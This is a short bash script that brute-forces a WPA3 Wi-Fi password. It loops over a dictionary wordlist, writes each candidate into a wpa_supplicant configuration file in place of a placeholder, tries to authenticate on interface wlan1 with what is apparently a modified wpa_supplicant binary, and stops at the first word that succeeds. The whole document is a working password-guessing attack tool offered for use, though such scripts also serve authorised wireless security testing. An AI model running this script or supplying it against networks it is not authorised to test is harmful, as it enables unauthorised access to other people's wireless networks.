#!/bin/bash
wordlist=/usr/share/dict/wordlist
supconf=/tmp/sup.conf
wpa3brutesup="./wpa_supplicant"
IFS=$'\n'
for x in $(cat $wordlist); do
  sed -i.bak "s/PASSPASS/$x/" $supconf
  ./wpa_supplicant -i wlan1 -c $supconf > /dev/null
  if [ $? -eq 127 ]; then
        echo $x:FAIL
  else
        echo $x:SUCCESS
        exit 0
  fi
  mv $supconf.bak $supconf
done
unset IFS
